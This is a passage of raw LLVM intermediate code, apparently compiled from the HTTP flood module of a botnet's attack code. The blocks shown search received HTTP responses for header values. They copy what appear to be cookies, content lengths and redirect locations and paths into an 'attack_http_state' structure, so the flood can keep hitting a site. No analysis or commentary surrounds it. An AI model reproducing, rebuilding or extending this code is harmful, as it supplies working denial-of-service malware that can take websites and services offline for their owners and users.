  %1295 = load i32, i32* %42, align 4
  %1296 = add nsw i32 %1294, %1295
  %1297 = sext i32 %1296 to i64
  %1298 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1297
  store i8 0, i8* %1298, align 1
  %1299 = load i8*, i8** %43, align 8
  %1300 = load i8*, i8** %43, align 8
  %1301 = call i32 @util_strlen(i8* noundef %1300)
  %1302 = call i8* @table_retrieve_val(i32 noundef 67, i32* noundef null)
  %1303 = call i32 @util_stristr(i8* noundef %1299, i32 noundef %1301, i8* noundef %1302)
  %1304 = icmp ne i32 %1303, 0
  br i1 %1304, label %1305, label %1308

1305:                                             ; preds = %1293
  %1306 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1307 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1306, i32 0, i32 13
  store i32 1, i32* %1307, align 4
  br label %1308

1308:                                             ; preds = %1305, %1293
  br label %1309

1309:                                             ; preds = %1308, %1273
  br label %1310

1310:                                             ; preds = %1309, %1251
  %1311 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1312 = load i32, i32* %12, align 4
  %1313 = call i8* @table_retrieve_val(i32 noundef 65, i32* noundef null)
  %1314 = call i32 @util_stristr(i8* noundef %1311, i32 noundef %1312, i8* noundef %1313)
  %1315 = icmp ne i32 %1314, -1
  br i1 %1315, label %1316, label %1361

1316:                                             ; preds = %1310
  %1317 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1318 = load i32, i32* %12, align 4
  %1319 = call i8* @table_retrieve_val(i32 noundef 65, i32* noundef null)
  %1320 = call i32 @util_stristr(i8* noundef %1317, i32 noundef %1318, i8* noundef %1319)
  store i32 %1320, i32* %44, align 4
  %1321 = load i32, i32* %44, align 4
  %1322 = sext i32 %1321 to i64
  %1323 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1322
  %1324 = load i8, i8* %1323, align 1
  %1325 = sext i8 %1324 to i32
  %1326 = icmp eq i32 %1325, 32
  br i1 %1326, label %1327, label %1330

1327:                                             ; preds = %1316
  %1328 = load i32, i32* %44, align 4
  %1329 = add nsw i32 %1328, 1
  store i32 %1329, i32* %44, align 4
  br label %1330

1330:                                             ; preds = %1327, %1316
  %1331 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1332 = load i32, i32* %44, align 4
  %1333 = sext i32 %1332 to i64
  %1334 = getelementptr inbounds i8, i8* %1331, i64 %1333
  %1335 = load i32, i32* %12, align 4
  %1336 = load i32, i32* %44, align 4
  %1337 = sub nsw i32 %1335, %1336
  %1338 = call i32 @util_memsearch(i8* noundef %1334, i32 noundef %1337, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 noundef 2)
  store i32 %1338, i32* %45, align 4
  %1339 = load i32, i32* %45, align 4
  %1340 = icmp ne i32 %1339, -1
  br i1 %1340, label %1341, label %1360

1341:                                             ; preds = %1330
  %1342 = load i32, i32* %44, align 4
  %1343 = sext i32 %1342 to i64
  %1344 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1343
  store i8* %1344, i8** %46, align 8
  %1345 = load i32, i32* %45, align 4
  %1346 = icmp sge i32 %1345, 2
  br i1 %1346, label %1347, label %1350

1347:                                             ; preds = %1341
  %1348 = load i32, i32* %45, align 4
  %1349 = sub nsw i32 %1348, 2
  store i32 %1349, i32* %45, align 4
  br label %1350

1350:                                             ; preds = %1347, %1341
  %1351 = load i32, i32* %44, align 4
  %1352 = load i32, i32* %45, align 4
  %1353 = add nsw i32 %1351, %1352
  %1354 = sext i32 %1353 to i64
  %1355 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1354
  store i8 0, i8* %1355, align 1
  %1356 = load i8*, i8** %46, align 8
  %1357 = call i32 @util_atoi(i8* noundef %1356, i32 noundef 10)
  %1358 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1359 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1358, i32 0, i32 14
  store i32 %1357, i32* %1359, align 4
  br label %1360

1360:                                             ; preds = %1350, %1330
  br label %1364

1361:                                             ; preds = %1310
  %1362 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1363 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1362, i32 0, i32 14
  store i32 0, i32* %1363, align 4
  br label %1364

1364:                                             ; preds = %1361, %1360
  store i32 0, i32* %37, align 4
  br label %1365

1365:                                             ; preds = %1540, %1364
  %1366 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1367 = load i32, i32* %37, align 4
  %1368 = sext i32 %1367 to i64
  %1369 = getelementptr inbounds i8, i8* %1366, i64 %1368
  %1370 = load i32, i32* %12, align 4
  %1371 = call i8* @table_retrieve_val(i32 noundef 64, i32* noundef null)
  %1372 = call i32 @util_stristr(i8* noundef %1369, i32 noundef %1370, i8* noundef %1371)
  %1373 = icmp ne i32 %1372, -1
  br i1 %1373, label %1374, label %1379

1374:                                             ; preds = %1365
  %1375 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1376 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1375, i32 0, i32 15
  %1377 = load i32, i32* %1376, align 4
  %1378 = icmp slt i32 %1377, 5
  br label %1379

1379:                                             ; preds = %1374, %1365
  %1380 = phi i1 [ false, %1365 ], [ %1378, %1374 ]
  br i1 %1380, label %1381, label %1544

1381:                                             ; preds = %1379
  %1382 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1383 = load i32, i32* %37, align 4
  %1384 = sext i32 %1383 to i64
  %1385 = getelementptr inbounds i8, i8* %1382, i64 %1384
  %1386 = load i32, i32* %12, align 4
  %1387 = call i8* @table_retrieve_val(i32 noundef 64, i32* noundef null)
  %1388 = call i32 @util_stristr(i8* noundef %1385, i32 noundef %1386, i8* noundef %1387)
  store i32 %1388, i32* %47, align 4
  %1389 = load i32, i32* %37, align 4
  %1390 = load i32, i32* %47, align 4
  %1391 = add nsw i32 %1389, %1390
  %1392 = sext i32 %1391 to i64
  %1393 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1392
  %1394 = load i8, i8* %1393, align 1
  %1395 = sext i8 %1394 to i32
  %1396 = icmp eq i32 %1395, 32
  br i1 %1396, label %1397, label %1400

1397:                                             ; preds = %1381
  %1398 = load i32, i32* %47, align 4
  %1399 = add nsw i32 %1398, 1
  store i32 %1399, i32* %47, align 4
  br label %1400

1400:                                             ; preds = %1397, %1381
  %1401 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1402 = load i32, i32* %37, align 4
  %1403 = sext i32 %1402 to i64
  %1404 = getelementptr inbounds i8, i8* %1401, i64 %1403
  %1405 = load i32, i32* %47, align 4
  %1406 = sext i32 %1405 to i64
  %1407 = getelementptr inbounds i8, i8* %1404, i64 %1406
  %1408 = load i32, i32* %12, align 4
  %1409 = load i32, i32* %37, align 4
  %1410 = sub nsw i32 %1408, %1409
  %1411 = load i32, i32* %47, align 4
  %1412 = sub nsw i32 %1410, %1411
  %1413 = call i32 @util_memsearch(i8* noundef %1407, i32 noundef %1412, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 noundef 2)
  store i32 %1413, i32* %48, align 4
  %1414 = load i32, i32* %48, align 4
  %1415 = icmp ne i32 %1414, -1
  br i1 %1415, label %1416, label %1540

1416:                                             ; preds = %1400
  %1417 = load i32, i32* %37, align 4
  %1418 = load i32, i32* %47, align 4
  %1419 = add nsw i32 %1417, %1418
  %1420 = sext i32 %1419 to i64
  %1421 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1420
  store i8* %1421, i8** %49, align 8
  %1422 = load i32, i32* %48, align 4
  %1423 = icmp sge i32 %1422, 2
  br i1 %1423, label %1424, label %1427

1424:                                             ; preds = %1416
  %1425 = load i32, i32* %48, align 4
  %1426 = sub nsw i32 %1425, 2
  store i32 %1426, i32* %48, align 4
  br label %1427

1427:                                             ; preds = %1424, %1416
  %1428 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1429 = load i32, i32* %37, align 4
  %1430 = sext i32 %1429 to i64
  %1431 = getelementptr inbounds i8, i8* %1428, i64 %1430
  %1432 = load i32, i32* %47, align 4
  %1433 = sext i32 %1432 to i64
  %1434 = getelementptr inbounds i8, i8* %1431, i64 %1433
  %1435 = load i32, i32* %12, align 4
  %1436 = load i32, i32* %37, align 4
  %1437 = sub nsw i32 %1435, %1436
  %1438 = load i32, i32* %47, align 4
  %1439 = sub nsw i32 %1437, %1438
  %1440 = call i32 @util_memsearch(i8* noundef %1434, i32 noundef %1439, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 noundef 1)
  %1441 = icmp sgt i32 %1440, 0
  br i1 %1441, label %1442, label %1457

1442:                                             ; preds = %1427
  %1443 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1444 = load i32, i32* %37, align 4
  %1445 = sext i32 %1444 to i64
  %1446 = getelementptr inbounds i8, i8* %1443, i64 %1445
  %1447 = load i32, i32* %47, align 4
  %1448 = sext i32 %1447 to i64
  %1449 = getelementptr inbounds i8, i8* %1446, i64 %1448
  %1450 = load i32, i32* %12, align 4
  %1451 = load i32, i32* %37, align 4
  %1452 = sub nsw i32 %1450, %1451
  %1453 = load i32, i32* %47, align 4
  %1454 = sub nsw i32 %1452, %1453
  %1455 = call i32 @util_memsearch(i8* noundef %1449, i32 noundef %1454, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 noundef 1)
  %1456 = sub nsw i32 %1455, 1
  store i32 %1456, i32* %48, align 4
  br label %1457

1457:                                             ; preds = %1442, %1427
  %1458 = load i32, i32* %37, align 4
  %1459 = load i32, i32* %47, align 4
  %1460 = add nsw i32 %1458, %1459
  %1461 = load i32, i32* %48, align 4
  %1462 = add nsw i32 %1460, %1461
  %1463 = sext i32 %1462 to i64
  %1464 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1463
  store i8 0, i8* %1464, align 1
  store i32 0, i32* %10, align 4
  br label %1465

1465:                                             ; preds = %1480, %1457
  %1466 = load i32, i32* %10, align 4
  %1467 = load i8*, i8** %49, align 8
  %1468 = call i32 @util_strlen(i8* noundef %1467)
  %1469 = icmp slt i32 %1466, %1468
  br i1 %1469, label %1470, label %1483

1470:                                             ; preds = %1465
  %1471 = load i8*, i8** %49, align 8
  %1472 = load i32, i32* %10, align 4
  %1473 = sext i32 %1472 to i64
  %1474 = getelementptr inbounds i8, i8* %1471, i64 %1473
  %1475 = load i8, i8* %1474, align 1
  %1476 = sext i8 %1475 to i32
  %1477 = icmp eq i32 %1476, 61
  br i1 %1477, label %1478, label %1479

1478:                                             ; preds = %1470
  br label %1483

1479:                                             ; preds = %1470
  br label %1480

1480:                                             ; preds = %1479
  %1481 = load i32, i32* %10, align 4
  %1482 = add nsw i32 %1481, 1
  store i32 %1482, i32* %10, align 4
  br label %1465, !llvm.loop !13

1483:                                             ; preds = %1478, %1465
  %1484 = load i8*, i8** %49, align 8
  %1485 = load i32, i32* %10, align 4
  %1486 = sext i32 %1485 to i64
  %1487 = getelementptr inbounds i8, i8* %1484, i64 %1486
  %1488 = load i8, i8* %1487, align 1
  %1489 = sext i8 %1488 to i32
  %1490 = icmp eq i32 %1489, 61
  br i1 %1490, label %1491, label %1539

1491:                                             ; preds = %1483
  %1492 = load i32, i32* %10, align 4
  store i32 %1492, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  br label %1493

1493:                                             ; preds = %1512, %1491
  %1494 = load i32, i32* %10, align 4
  %1495 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1496 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1495, i32 0, i32 15
  %1497 = load i32, i32* %1496, align 4
  %1498 = icmp slt i32 %1494, %1497
  br i1 %1498, label %1499, label %1515

1499:                                             ; preds = %1493
  %1500 = load i8*, i8** %49, align 8
  %1501 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1502 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1501, i32 0, i32 16
  %1503 = load i32, i32* %10, align 4
  %1504 = sext i32 %1503 to i64
  %1505 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1502, i64 0, i64 %1504
  %1506 = getelementptr inbounds [128 x i8], [128 x i8]* %1505, i64 0, i64 0
  %1507 = load i32, i32* %50, align 4
  %1508 = call signext i8 @util_strncmp(i8* noundef %1500, i8* noundef %1506, i32 noundef %1507)
  %1509 = icmp ne i8 %1508, 0
  br i1 %1509, label %1510, label %1511

1510:                                             ; preds = %1499
  store i32 1, i32* %51, align 4
  br label %1515

1511:                                             ; preds = %1499
  br label %1512

1512:                                             ; preds = %1511
  %1513 = load i32, i32* %10, align 4
  %1514 = add nsw i32 %1513, 1
  store i32 %1514, i32* %10, align 4
  br label %1493, !llvm.loop !14

1515:                                             ; preds = %1510, %1493
  %1516 = load i32, i32* %51, align 4
  %1517 = icmp ne i32 %1516, 0
  br i1 %1517, label %1538, label %1518

1518:                                             ; preds = %1515
  %1519 = load i8*, i8** %49, align 8
  %1520 = call i32 @util_strlen(i8* noundef %1519)
  %1521 = icmp slt i32 %1520, 128
  br i1 %1521, label %1522, label %1537

1522:                                             ; preds = %1518
  %1523 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1524 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1523, i32 0, i32 16
  %1525 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1526 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1525, i32 0, i32 15
  %1527 = load i32, i32* %1526, align 4
  %1528 = sext i32 %1527 to i64
  %1529 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1524, i64 0, i64 %1528
  %1530 = getelementptr inbounds [128 x i8], [128 x i8]* %1529, i64 0, i64 0
  %1531 = load i8*, i8** %49, align 8
  %1532 = call i32 @util_strcpy(i8* noundef %1530, i8* noundef %1531)
  %1533 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1534 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1533, i32 0, i32 15
  %1535 = load i32, i32* %1534, align 4
  %1536 = add nsw i32 %1535, 1
  store i32 %1536, i32* %1534, align 4
  br label %1537

1537:                                             ; preds = %1522, %1518
  br label %1538

1538:                                             ; preds = %1537, %1515
  br label %1539

1539:                                             ; preds = %1538, %1483
  br label %1540

1540:                                             ; preds = %1539, %1400
  %1541 = load i32, i32* %47, align 4
  %1542 = load i32, i32* %37, align 4
  %1543 = add nsw i32 %1542, %1541
  store i32 %1543, i32* %37, align 4
  br label %1365, !llvm.loop !15

1544:                                             ; preds = %1379
  %1545 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1546 = load i32, i32* %12, align 4
  %1547 = call i8* @table_retrieve_val(i32 noundef 63, i32* noundef null)
  %1548 = call i32 @util_stristr(i8* noundef %1545, i32 noundef %1546, i8* noundef %1547)
  %1549 = icmp ne i32 %1548, -1
  br i1 %1549, label %1550, label %1729

1550:                                             ; preds = %1544
  %1551 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1552 = load i32, i32* %12, align 4
  %1553 = call i8* @table_retrieve_val(i32 noundef 63, i32* noundef null)
  %1554 = call i32 @util_stristr(i8* noundef %1551, i32 noundef %1552, i8* noundef %1553)
  store i32 %1554, i32* %52, align 4
  %1555 = load i32, i32* %52, align 4
  %1556 = sext i32 %1555 to i64
  %1557 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1556
  %1558 = load i8, i8* %1557, align 1
  %1559 = sext i8 %1558 to i32
  %1560 = icmp eq i32 %1559, 32
  br i1 %1560, label %1561, label %1564

1561:                                             ; preds = %1550
  %1562 = load i32, i32* %52, align 4
  %1563 = add nsw i32 %1562, 1
  store i32 %1563, i32* %52, align 4
  br label %1564

1564:                                             ; preds = %1561, %1550
  %1565 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1566 = load i32, i32* %52, align 4
  %1567 = sext i32 %1566 to i64
  %1568 = getelementptr inbounds i8, i8* %1565, i64 %1567
  %1569 = load i32, i32* %12, align 4
  %1570 = load i32, i32* %52, align 4
  %1571 = sub nsw i32 %1569, %1570
  %1572 = call i32 @util_memsearch(i8* noundef %1568, i32 noundef %1571, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 noundef 2)
  store i32 %1572, i32* %53, align 4
  %1573 = load i32, i32* %53, align 4
  %1574 = icmp ne i32 %1573, -1
  br i1 %1574, label %1575, label %1728

1575:                                             ; preds = %1564
  %1576 = load i32, i32* %52, align 4
  %1577 = sext i32 %1576 to i64
  %1578 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1577
  store i8* %1578, i8** %54, align 8
  %1579 = load i32, i32* %53, align 4
  %1580 = icmp sge i32 %1579, 2
  br i1 %1580, label %1581, label %1584

1581:                                             ; preds = %1575
  %1582 = load i32, i32* %53, align 4
  %1583 = sub nsw i32 %1582, 2
  store i32 %1583, i32* %53, align 4
  br label %1584

1584:                                             ; preds = %1581, %1575
  %1585 = load i32, i32* %52, align 4
  %1586 = load i32, i32* %53, align 4
  %1587 = add nsw i32 %1585, %1586
  %1588 = sext i32 %1587 to i64
  %1589 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1588
  store i8 0, i8* %1589, align 1
  %1590 = load i32, i32* %53, align 4
  %1591 = add nsw i32 %1590, 1
  store i32 %1591, i32* %53, align 4
  %1592 = load i8*, i8** %54, align 8
  %1593 = load i32, i32* %53, align 4
  %1594 = call i32 @util_memsearch(i8* noundef %1592, i32 noundef %1593, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i32 noundef 4)
  %1595 = icmp eq i32 %1594, 4
  br i1 %1595, label %1596, label %1686

1596:                                             ; preds = %1584
  store i32 7, i32* %10, align 4
  %1597 = load i8*, i8** %54, align 8
  %1598 = getelementptr inbounds i8, i8* %1597, i64 4
  %1599 = load i8, i8* %1598, align 1
  %1600 = sext i8 %1599 to i32
  %1601 = icmp eq i32 %1600, 115
  br i1 %1601, label %1602, label %1605

1602:                                             ; preds = %1596
  %1603 = load i32, i32* %10, align 4
  %1604 = add nsw i32 %1603, 1
  store i32 %1604, i32* %10, align 4
  br label %1605

1605:                                             ; preds = %1602, %1596
  %1606 = load i8*, i8** %54, align 8
  %1607 = load i8*, i8** %54, align 8
  %1608 = load i32, i32* %10, align 4
  %1609 = sext i32 %1608 to i64
  %1610 = getelementptr inbounds i8, i8* %1607, i64 %1609
  %1611 = load i32, i32* %53, align 4
  %1612 = load i32, i32* %10, align 4
  %1613 = sub nsw i32 %1611, %1612
  %1614 = sext i32 %1613 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 1 %1606, i8* align 1 %1610, i64 %1614, i1 false)
  store i32 0, i32* %10, align 4
  br label %1615

1615:                                             ; preds = %1636, %1605
  %1616 = load i8*, i8** %54, align 8
  %1617 = load i32, i32* %10, align 4
  %1618 = sext i32 %1617 to i64
  %1619 = getelementptr inbounds i8, i8* %1616, i64 %1618
  %1620 = load i8, i8* %1619, align 1
  %1621 = sext i8 %1620 to i32
  %1622 = icmp ne i32 %1621, 0
  br i1 %1622, label %1623, label %1639

1623:                                             ; preds = %1615
  %1624 = load i8*, i8** %54, align 8
  %1625 = load i32, i32* %10, align 4
  %1626 = sext i32 %1625 to i64
  %1627 = getelementptr inbounds i8, i8* %1624, i64 %1626
  %1628 = load i8, i8* %1627, align 1
  %1629 = sext i8 %1628 to i32
  %1630 = icmp eq i32 %1629, 47
  br i1 %1630, label %1631, label %1636

1631:                                             ; preds = %1623
  %1632 = load i8*, i8** %54, align 8
  %1633 = load i32, i32* %10, align 4
  %1634 = sext i32 %1633 to i64
  %1635 = getelementptr inbounds i8, i8* %1632, i64 %1634
  store i8 0, i8* %1635, align 1
  br label %1639

1636:                                             ; preds = %1623
  %1637 = load i32, i32* %10, align 4
  %1638 = add nsw i32 %1637, 1
  store i32 %1638, i32* %10, align 4
  br label %1615, !llvm.loop !16

1639:                                             ; preds = %1631, %1615
  %1640 = load i8*, i8** %54, align 8
  %1641 = call i32 @util_strlen(i8* noundef %1640)
  %1642 = icmp sgt i32 %1641, 0
  br i1 %1642, label %1643, label %1653

1643:                                             ; preds = %1639
  %1644 = load i8*, i8** %54, align 8
  %1645 = call i32 @util_strlen(i8* noundef %1644)
  %1646 = icmp slt i32 %1645, 128
  br i1 %1646, label %1647, label %1653

1647:                                             ; preds = %1643
  %1648 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1649 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1648, i32 0, i32 7
  %1650 = getelementptr inbounds [129 x i8], [129 x i8]* %1649, i64 0, i64 0
  %1651 = load i8*, i8** %54, align 8
  %1652 = call i32 @util_strcpy(i8* noundef %1650, i8* noundef %1651)
  br label %1653

1653:                                             ; preds = %1647, %1643, %1639
  %1654 = load i8*, i8** %54, align 8
  %1655 = load i32, i32* %10, align 4
  %1656 = add nsw i32 %1655, 1
  %1657 = sext i32 %1656 to i64
  %1658 = getelementptr inbounds i8, i8* %1654, i64 %1657
  %1659 = call i32 @util_strlen(i8* noundef %1658)
  %1660 = icmp slt i32 %1659, 256
  br i1 %1660, label %1661, label %1685

1661:                                             ; preds = %1653
  %1662 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1663 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1662, i32 0, i32 6
  %1664 = getelementptr inbounds [257 x i8], [257 x i8]* %1663, i64 0, i64 0
  %1665 = getelementptr inbounds i8, i8* %1664, i64 1
  call void @util_zero(i8* noundef %1665, i32 noundef 255)
  %1666 = load i8*, i8** %54, align 8
  %1667 = load i32, i32* %10, align 4
  %1668 = add nsw i32 %1667, 1
  %1669 = sext i32 %1668 to i64
  %1670 = getelementptr inbounds i8, i8* %1666, i64 %1669
  %1671 = call i32 @util_strlen(i8* noundef %1670)
  %1672 = icmp sgt i32 %1671, 0
  br i1 %1672, label %1673, label %1684

1673:                                             ; preds = %1661
  %1674 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1675 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1674, i32 0, i32 6
  %1676 = getelementptr inbounds [257 x i8], [257 x i8]* %1675, i64 0, i64 0
  %1677 = getelementptr inbounds i8, i8* %1676, i64 1
  %1678 = load i8*, i8** %54, align 8
  %1679 = load i32, i32* %10, align 4
  %1680 = add nsw i32 %1679, 1
  %1681 = sext i32 %1680 to i64
  %1682 = getelementptr inbounds i8, i8* %1678, i64 %1681
  %1683 = call i32 @util_strcpy(i8* noundef %1677, i8* noundef %1682)
  br label %1684

1684:                                             ; preds = %1673, %1661
  br label %1685

1685:                                             ; preds = %1684, %1653
  br label %1725

1686:                                             ; preds = %1584
  %1687 = load i8*, i8** %54, align 8
  %1688 = getelementptr inbounds i8, i8* %1687, i64 0
  %1689 = load i8, i8* %1688, align 1
  %1690 = sext i8 %1689 to i32
  %1691 = icmp eq i32 %1690, 47
  br i1 %1691, label %1692, label %1724

1692:                                             ; preds = %1686
  %1693 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1694 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1693, i32 0, i32 6
  %1695 = getelementptr inbounds [257 x i8], [257 x i8]* %1694, i64 0, i64 0
  %1696 = getelementptr inbounds i8, i8* %1695, i64 1
  call void @util_zero(i8* noundef %1696, i32 noundef 255)
  %1697 = load i8*, i8** %54, align 8
  %1698 = load i32, i32* %10, align 4
  %1699 = add nsw i32 %1698, 1
  %1700 = sext i32 %1699 to i64
  %1701 = getelementptr inbounds i8, i8* %1697, i64 %1700
  %1702 = call i32 @util_strlen(i8* noundef %1701)
  %1703 = icmp sgt i32 %1702, 0
  br i1 %1703, label %1704, label %1723

1704:                                             ; preds = %1692
  %1705 = load i8*, i8** %54, align 8
  %1706 = load i32, i32* %10, align 4
  %1707 = add nsw i32 %1706, 1
  %1708 = sext i32 %1707 to i64
  %1709 = getelementptr inbounds i8, i8* %1705, i64 %1708
  %1710 = call i32 @util_strlen(i8* noundef %1709)
  %1711 = icmp slt i32 %1710, 256
  br i1 %1711, label %1712, label %1723

1712:                                             ; preds = %1704
  %1713 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1714 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1713, i32 0, i32 6
  %1715 = getelementptr inbounds [257 x i8], [257 x i8]* %1714, i64 0, i64 0
  %1716 = getelementptr inbounds i8, i8* %1715, i64 1
  %1717 = load i8*, i8** %54, align 8
  %1718 = load i32, i32* %10, align 4
  %1719 = add nsw i32 %1718, 1
  %1720 = sext i32 %1719 to i64
  %1721 = getelementptr inbounds i8, i8* %1717, i64 %1720
  %1722 = call i32 @util_strcpy(i8* noundef %1716, i8* noundef %1721)
  br label %1723

1723:                                             ; preds = %1712, %1704, %1692
  br label %1724

1724:                                             ; preds = %1723, %1686
  br label %1725

1725:                                             ; preds = %1724, %1685
  %1726 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1727 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1726, i32 0, i32 1
  store i8 1, i8* %1727, align 4
  br label %2543

1728:                                             ; preds = %1564
  br label %1729

1729:                                             ; preds = %1728, %1544
  %1730 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1731 = load i32, i32* %12, align 4
  %1732 = call i8* @table_retrieve_val(i32 noundef 62, i32* noundef null)
  %1733 = call i32 @util_stristr(i8* noundef %1730, i32 noundef %1731, i8* noundef %1732)
  %1734 = icmp ne i32 %1733, -1
  br i1 %1734, label %1735, label %2065

1735:                                             ; preds = %1729
  %1736 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1737 = load i32, i32* %12, align 4
  %1738 = call i8* @table_retrieve_val(i32 noundef 62, i32* noundef null)
  %1739 = call i32 @util_stristr(i8* noundef %1736, i32 noundef %1737, i8* noundef %1738)
  store i32 %1739, i32* %55, align 4
  %1740 = load i32, i32* %55, align 4
  %1741 = sext i32 %1740 to i64
  %1742 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1741
  %1743 = load i8, i8* %1742, align 1
  %1744 = sext i8 %1743 to i32
  %1745 = icmp eq i32 %1744, 32
  br i1 %1745, label %1746, label %1749

1746:                                             ; preds = %1735
  %1747 = load i32, i32* %55, align 4
  %1748 = add nsw i32 %1747, 1
  store i32 %1748, i32* %55, align 4
  br label %1749

1749:                                             ; preds = %1746, %1735
  %1750 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1751 = load i32, i32* %55, align 4
  %1752 = sext i32 %1751 to i64
  %1753 = getelementptr inbounds i8, i8* %1750, i64 %1752
  %1754 = load i32, i32* %12, align 4
  %1755 = load i32, i32* %55, align 4
  %1756 = sub nsw i32 %1754, %1755
  %1757 = call i32 @util_memsearch(i8* noundef %1753, i32 noundef %1756, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 noundef 2)
  store i32 %1757, i32* %56, align 4
  %1758 = load i32, i32* %56, align 4
  %1759 = icmp ne i32 %1758, -1
  br i1 %1759, label %1760, label %2064

1760:                                             ; preds = %1749
  %1761 = load i32, i32* %55, align 4
  %1762 = sext i32 %1761 to i64
  %1763 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1762
  store i8* %1763, i8** %57, align 8
  %1764 = load i32, i32* %56, align 4
  %1765 = icmp sge i32 %1764, 2
  br i1 %1765, label %1766, label %1769

1766:                                             ; preds = %1760
  %1767 = load i32, i32* %56, align 4
  %1768 = sub nsw i32 %1767, 2
  store i32 %1768, i32* %56, align 4
  br label %1769

1769:                                             ; preds = %1766, %1760
  %1770 = load i32, i32* %55, align 4
  %1771 = load i32, i32* %56, align 4
  %1772 = add nsw i32 %1770, %1771
  %1773 = sext i32 %1772 to i64
  %1774 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1773
  store i8 0, i8* %1774, align 1
  %1775 = load i32, i32* %56, align 4
  %1776 = add nsw i32 %1775, 1
  store i32 %1776, i32* %56, align 4
  store i32 0, i32* %10, align 4
  br label %1777

1777:                                             ; preds = %1803, %1769
  %1778 = load i8*, i8** %57, align 8
  %1779 = load i32, i32* %10, align 4
  %1780 = sext i32 %1779 to i64
  %1781 = getelementptr inbounds i8, i8* %1778, i64 %1780
  %1782 = load i8, i8* %1781, align 1
  %1783 = sext i8 %1782 to i32
  %1784 = icmp ne i32 %1783, 0
  br i1 %1784, label %1785, label %1801

1785:                                             ; preds = %1777
  %1786 = load i8*, i8** %57, align 8
  %1787 = load i32, i32* %10, align 4
  %1788 = sext i32 %1787 to i64
  %1789 = getelementptr inbounds i8, i8* %1786, i64 %1788
  %1790 = load i8, i8* %1789, align 1
  %1791 = sext i8 %1790 to i32
